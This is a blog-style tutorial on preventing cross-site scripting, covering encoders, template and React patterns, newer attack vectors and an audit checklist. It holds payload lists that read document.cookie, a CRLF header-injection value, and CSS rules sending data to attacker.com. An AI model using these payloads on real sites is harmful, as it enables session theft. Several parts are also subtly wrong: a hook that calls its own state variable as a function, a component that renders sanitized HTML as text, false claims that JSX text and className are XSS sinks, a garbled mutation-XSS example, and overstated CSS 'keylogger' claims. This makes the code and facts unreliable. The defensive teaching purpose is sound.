---
title: "Advanced XSS Prevention"
description: ""
date: "2026-04-24"
author: "Saul Vo"
tags: ["xss","csrf","csp","security"]
readingTime: "5 min"
order: 2
slug: "xss-advanced"
category: "xss-csrf-csp"
---

# Advanced XSS Prevention

## Mục lục
1. [XSS Deep Dive](#1-xss-deep-dive)
2. [Context-Aware Escaping](#2-context-aware-escaping)
3. [Template Security](#3-template-security)
4. [React Security Patterns](#4-react-security-patterns)
5. [Modern XSS Vectors](#5-modern-xss-vectors)
6. [XSS Audit Checklist](#6-xss-audit-checklist)

---

## 1. XSS Deep Dive

### XSS Types Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                    XSS Types Compared                               │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐  │
│  │  Reflected XSS                                               │  │
│  │  • User input reflected in response without sanitization   │  │
│  │  • Example: /search?q=<script>alert(1)</script>            │  │
│  │  • Requires user interaction (phishing link)                  │  │
│  └─────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐  │
│  │  Stored (Persistent) XSS                                     │  │
│  │  • Malicious script stored in database                      │  │
│  │  • Served to all users who view the affected page          │  │
│  │  • Most dangerous - no user interaction needed             │  │
│  │  • Example: Stored XSS in chat message, profile field       │  │
│  └─────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐  │
│  │  DOM-Based XSS                                               │  │
│  │  • Vulnerable JavaScript processes user input              │  │
│  │  • Example: document.write(location.hash)                    │  │
│  │  • Happens entirely client-side                              │  │
│  └─────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐  │
│  │  Mutation XSS (mXSS)                                        │  │
│  │  • Browser parses/serializes HTML differently              │  │
│  │  • Example: <style>payload</style> → differs after parsing  │  │
│  │  • Bypasses sanitizers that check initial HTML              │  │
│  └─────────────────────────────────────────────────────────────┘  │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### XSS via HTML Injection

```html
<!-- Classic script injection -->
<script>alert(document.cookie)</script>
<img src=x onerror=alert(document.cookie)>
<svg onload=alert(document.cookie)>
<body onload=alert(document.cookie)>
<iframe src="javascript:alert(document.cookie)">
<object data="javascript:alert(document.cookie)">
<link href="javascript:alert(document.cookie)">
<embed src="javascript:alert(document.cookie)">

<!-- Event handlers -->
<div onclick="alert(document.cookie)" onmouseover="alert(document.cookie)">click me</div>
<marquee onstart="alert(document.cookie)">
<video><source onerror="alert(document.cookie)">
<a href="javascript:alert(document.cookie)">click</a>

<!-- CSS injection -->
<div style="background: url('javascript:alert(document.cookie)')">
<div style="animation: url('javascript:alert(document.cookie)')">

<!-- Meta tag injection -->
<meta http-equiv="refresh" content="0;url=javascript:alert(document.cookie)">
```

### XSS via URL Manipulation

```javascript
// DOM-based XSS via URL
location.href = userInput;           // Direct assignment
location.replace(userInput);         // Replace
document.write(location.search);     // document.write
element.innerHTML = location.hash;   // innerHTML

// Example payloads via hash
#<img src=x onerror=alert(document.cookie)>
#<svg onload=alert(document.cookie)>
#javascript:alert(document.cookie)

// decodeURI component manipulation
decodeURIComponent("%3Cscript%3Ealert%281%29%3C/script%3E")
```

---

## 2. Context-Aware Escaping

### Output Encoding by Context

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Encoding Contexts                                 │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  HTML Context (body, attribute values between quotes)               │
│  ┌─────────────────────────────────────────────────────────────┐  │
│  │  < → &lt;    > → &gt;    " → &quot;    ' → &#x27;         │  │
│  │  & → &amp;                                        │  │
│  └─────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  HTML Attribute Context                                             │
│  ┌─────────────────────────────────────────────────────────────┐  │
│  │  All of HTML context + encode attribute-specific chars     │  │
│  │  space, tab, newline, =, <, >, /, ', "                     │  │
│  └─────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  JavaScript Context                                                 │
│  ┌─────────────────────────────────────────────────────────────┐  │
│  │  \ → \\    / → \/    < → \x3C    > → \x3E    ' → \'       │  │
│  │  " → \"    & → \x26    newline → \n    tab → \t          │  │
│  └─────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  URL Context                                                        │
│  ┌─────────────────────────────────────────────────────────────┐  │
│  │  Encode using encodeURIComponent for query params         │  │
│  │  % → %25    < → %3C    > → %3E    " → %22                │  │
│  └─────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  CSS Context                                                        │
│  ┌─────────────────────────────────────────────────────────────┐  │
│  │  \ → \\    / → \/    < → \\3C    > → \\3E    ' → \'       │  │
│  │  " → \"    & → \&    newline → \A                       │  │
│  └─────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  JSON Context                                                       │
│  ┌─────────────────────────────────────────────────────────────┐  │
│  │  Use JSON.stringify() - handles all necessary escaping     │  │
│  └─────────────────────────────────────────────────────────────┘  │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### Context-Aware Encoder

```typescript
// Context-aware output encoder
const HtmlEncoder = {
  encode(text: string): string {
    return text
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;');
  },

  encodeAttribute(text: string): string {
    return this.encode(text)
      .replace(/ /g, '&#x20;')
      .replace(/\t/g, '&#x9;')
      .replace(/\n/g, '&#xA;')
      .replace(/=/g, '&#x3D;')
      .replace(/</g, '&lt;');
  },

  encodeJavaScript(text: string): string {
    return text
      .replace(/\\/g, '\\\\')
      .replace(/"/g, '\\"')
      .replace(/'/g, "\\'")
      .replace(/</g, '\\x3C')
      .replace(/>/g, '\\x3E')
      .replace(/&/g, '\\x26')
      .replace(/\n/g, '\\n')
      .replace(/\r/g, '\\r')
      .replace(/\t/g, '\\t');
  },

  encodeURL(text: string): string {
    return encodeURIComponent(text);
  },

  encodeCSS(text: string): string {
    return text
      .replace(/\\/g, '\\\\')
      .replace(/"/g, '\\"')
      .replace(/'/g, "\\'")
      .replace(/</g, '\\3C')
      .replace(/>/g, '\\3E')
      .replace(/&/g, '\\26')
      .replace(/\n/g, '\\A')
      .replace(/ /g, '\\20');
  }
};

// Usage in templates
function safeAttribute(name: string, value: string): string {
  return `${name}="${HtmlEncoder.encodeAttribute(value)}"`;
}

function safeScript(content: string): string {
  return `<script>${HtmlEncoder.encodeJavaScript(content)}</script>`;
}
```

### Nested Context Handling

```typescript
// Example: User content inside JavaScript inside HTML
// <div onclick="handler('${userInput}')">

// Must encode for BOTH JavaScript and HTML attribute contexts
function encodeForNestedContext(userInput: string): string {
  // First: JavaScript context
  const jsEncoded = HtmlEncoder.encodeJavaScript(userInput);
  // Then: HTML attribute context
  const htmlAttrEncoded = HtmlEncoder.encodeAttribute(jsEncoded);
  return htmlAttrEncoded;
}

// Result: <div onclick="handler('user\u0027s input')">
```

---

## 3. Template Security

### Twig Template Security

```twig
{# Safe - auto-escaped by default #}
{{ userInput }}

{# DANGEROUS - raw filter disables escaping #}
{{ userInput|raw }}

{# DANGEROUS - autoescape disabled #}
{% autoescape false %}
  {{ userInput }}
{% endautoescape %}

{# Safe - explicit escaping with context #}
{{ userInput|e('html') }}        {# HTML context #}
{{ userInput|e('js') }}          {# JavaScript context #}
{{ userInput|e('url') }}         {# URL context #}
{{ userInput|e('html_attr') }}   {# HTML attribute context #}
{{ userInput|e('css') }}         {# CSS context #}
```

### React JSX Security

```tsx
// SAFE: React escapes by default
function SafeComponent() {
  return <div>{userInput}</div>;
}

// DANGEROUS: dangerouslySetInnerHTML bypasses escaping
function DangerousComponent() {
  return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
}

// SAFE with sanitization: sanitize first
import DOMPurify from 'dompurify';

function SafeWithSanitization() {
  const sanitized = DOMPurify.sanitize(userInput, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// SAFE: URL validation
function SafeLink({ href }) {
  // Validate URL protocol
  const safeHref = href.startsWith('https://') ? href : '#';
  return <a href={safeHref}>Link</a>;
}
```

### Next.js Server Components

```tsx
// app/components/SafeUserContent.tsx
import DOMPurify from 'dompurify';

// Server Component - user content in different contexts
export async function UserPost({ content }: { content: string }) {
  // Sanitize for display
  const sanitized = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href']
  });

  return (
    <article
      dangerouslySetInnerHTML={{ __html: sanitized }}
    />
  );
}

export async function UserComment({ content }: { content: string }) {
  // Stricter sanitization for comments
  const sanitized = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []  // No attributes allowed
  });

  return <p>{sanitized}</p>;
}

export async function UserMention({ username }: { username: string }) {
  // For mentions, only allow simple text
  return <span className="mention">@{username}</span>;
}
```

---

## 4. React Security Patterns

### Dangerous Patterns to Avoid

```tsx
// DANGEROUS: Reflecting user input into state then rendering
function DangerousComponent() {
  const [value, setValue] = useState('');

  // User input directly into state
  useEffect(() => {
    setValue(new URLSearchParams(window.location.search).get('q') || '');
  }, []);

  // Later rendered - potential XSS
  return <div>{value}</div>;
}

// DANGEROUS: Dynamic class names from user input
function DangerousClassName() {
  const userClass = new URLSearchParams(window.location.search).get('class');
  // Attacker could set: "foo' onload='alert(1)' x='"
  return <div className={userClass}>Content</div>;
}

// DANGEROUS: Using user input in style
function DangerousStyle() {
  const userColor = new URLSearchParams(window.location.search).get('color');
  return <div style={{ color: userColor }}>Text</div>;
}

// DANGEROUS: InnerHTML with user data
function DangerousInnerHTML() {
  return <div innerHTML={userInput} />;  // Would be DOM innerHTML
}
```

### Safe React Patterns

```tsx
// SAFE: Escape before storing in state
function SafeComponent() {
  const [value, setValue] = useState('');

  useEffect(() => {
    const param = new URLSearchParams(window.location.search).get('q');
    // Escape before storing
    const sanitized = DOMPurify.sanitize(param || '', { ALLOWED_TAGS: [], ALLOWED_ATTR: [] });
    setValue(sanitized);
  }, []);

  return <div>{value}</div>;
}

// SAFE: Allowlist for class names
const ALLOWED_CLASSES = ['primary', 'secondary', 'danger', 'success'];

function SafeClassName() {
  const userClass = new URLSearchParams(window.location.search).get('class');
  const safeClass = ALLOWED_CLASSES.includes(userClass || '') ? userClass : 'default';
  return <div className={safeClass}>Content</div>;
}

// SAFE: Validate style values
function SafeStyle() {
  const userColor = new URLSearchParams(window.location.search).get('color');
  // Only allow hex colors
  const safeColor = /^#[0-9A-Fa-f]{6}$/.test(userColor || '') ? userColor : 'inherit';
  return <div style={{ color: safeColor }}>Text</div>;
}

// SAFE: URL validation for links
function SafeURLLink() {
  const userUrl = new URLSearchParams(window.location.search).get('url');

  const safeUrl = (() => {
    try {
      const url = new URL(userUrl || '', window.location.origin);
      return ['http:', 'https:'].includes(url.protocol) ? url.href : '#';
    } catch {
      return '#';
    }
  })();

  return <a href={safeUrl}>Link</a>;
}
```

### React Security Utilities

```typescript
// lib/react-security.ts
import DOMPurify from 'dompurify';

// Sanitize for React
export function sanitizeForReact(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'u', 'a', 'br', 'p', 'code', 'pre'],
    ALLOWED_ATTR: ['href', 'title', 'target', 'rel'],
    ADD_ATTR: ['target', 'rel']
  });
}

// Validate class name against allowlist
export function safeClassName(unsafe: string, allowlist: string[]): string {
  const normalized = unsafe.toLowerCase().trim();
  return allowlist.includes(normalized) ? normalized : '';
}

// Validate and sanitize color values
export function safeColor(unsafe: string): string {
  // Hex colors only
  if (/^#[0-9A-Fa-f]{6}$/.test(unsafe)) return unsafe;
  // RGB format
  if (/^rgb\(\d{1,3},\s*\d{1,3},\s*\d{1,3}\)$/.test(unsafe)) return unsafe;
  return 'inherit';
}

// Validate URL protocol
export function safeUrl(unsafe: string, defaultUrl = '#'): string {
  try {
    const url = new URL(unsafe, window.location.origin);
    return ['http:', 'https:', 'mailto:'].includes(url.protocol) ? url.href : defaultUrl;
  } catch {
    return defaultUrl;
  }
}

// Hook for safe URL
export function useSafeUrl(getter: () => string) {
  const [safeUrl, setSafeUrl] = useState('#');

  useEffect(() => {
    const url = getter();
    setSafeUrl(safeUrl(url));
  }, []);

  return safeUrl;
}
```

---

## 5. Modern XSS Vectors

### Mutation XSS (mXSS)

```html
<!-- Example: style tag mutation -->
<style><style/><img src=x onerror=alert(1)></style>

<!-- After browser parsing, this becomes: -->
<style><style/><img src="x" onerror="alert(1)"></style>
<style></style>  <!-- Empty style, img executes -->

<!-- Defense: Don't rely on server-side HTML sanitization alone -->
<!-- Use DOMPurify with ALLOWED_TAGS that doesn't include <style> in dangerous contexts -->
```

### Service Worker Injection

```javascript
// Service Worker can intercept all requests
// If attacker can register a malicious SW:

// payload.js - served from victim's site
self.addEventListener('fetch', (event) => {
  // Capture all requests
  if (event.request.url.includes('/api/')) {
    event.respondWith(
      fetch(event.request)
        .then(response => {
          // Clone and modify response
          const modified = new Response(response.body, response);
          // Inject script into HTML responses
          return modified;
        })
    );
  }
});

// Prevention: Don't allow user-controlled SW registration
// Only register SWs from your own controlled URLs
```

### Cookie Tossing / CRLF

```javascript
// CRLF Injection - set cookie via user input
// If server reflects header values:

// User input: "value\r\nSet-Cookie: evil=1"
// Results in two headers:
// Set-Cookie: value
// Set-Cookie: evil=1

// Prevention: Validate and sanitize all header values
function sanitizeHeader(value: string): string {
  return value.replace(/[\r\n]/g, '');
}
```

### DNS Rebinding via WebSocket

```javascript
// WebSocket doesn't enforce Same-Origin Policy same as HTTP
// If WebSocket URL is user-controlled:

// Attacker sets up DNS that changes after initial request
// Initially resolves to victim server IP, then to attacker's IP

// Prevention: Verify connection origin on WebSocket server
// And use token-based auth instead of relying on connection origin
```

### CSS Injection Extended

```css
/* Stealing data via CSS */
input[type="password"][value*="secret"] {
  background-image: url("https://attacker.com/log?css=leak");
}

/* Keylogger via CSS */
input[name="password"]:focus ~ * {
  background-image: url("https://attacker.com/keylog?key=pressed");
}

/* Page scraping via CSS */
@page {
  content: "Stolen: " attr(data-content);
}
```

---

## 6. XSS Audit Checklist

### Code Review Points

- [ ] **All user input is validated, not just sanitized**
- [ ] **All output is escaped based on context**
- [ ] **dangerouslySetInnerHTML used only with prior sanitization**
- [ ] **URLs validated before use in href, src, action**
- [ ] **JavaScript URLs (javascript:) blocked**
- [ ] **Event handlers not created from user input**
- [ ] **No eval() or new Function() with user input**
- [ ] **No string concatenation to build HTML from user input**
- [ ] **CSS values allowlisted or validated**
- [ ] **Template engines auto-escape enabled**
- [ ] **DOM manipulation uses safe APIs only**

### React-Specific

- [ ] **No dangerouslySetInnerHTML with unsanitized content**
- [ ] **No innerHTML property assignment**
- [ ] **User input not reflected into script tags**
- [ ] **URLs in href validated for protocol (no javascript:)**
- [ ] **CSS properties validated (no expressions)**
- [ ] **Class names allowlisted**
- [ ] **No string concatenation in JSX that includes user data**

### Server-Side

- [ ] **Content-Type: text/html with charset specified**
- [ ] **X-Content-Type-Options: nosniff set**
- [ ] **Input validation (length, format, type)**
- [ ] **Stored XSS prevented via output encoding**
- [ ] **HTTPOnly, Secure flags on session cookies**
- [ ] **CSP header configured**
- [ ] **No reflected parameters in error messages**

### Testing for XSS

```bash
# Basic payloads to test
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<a href="javascript:alert(1)">click
'><script>alert(1)</script>
"><script>alert(1)</script>
javascript:alert(1)

# Test each context
# - HTML body
# - HTML attributes
# - JavaScript strings
# - URL parameters
# - CSS
# - JSON
```

---

## OWASP References

- [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOM XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [Testing for XSS](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Reflected_Cross_Site_Scripting.html)
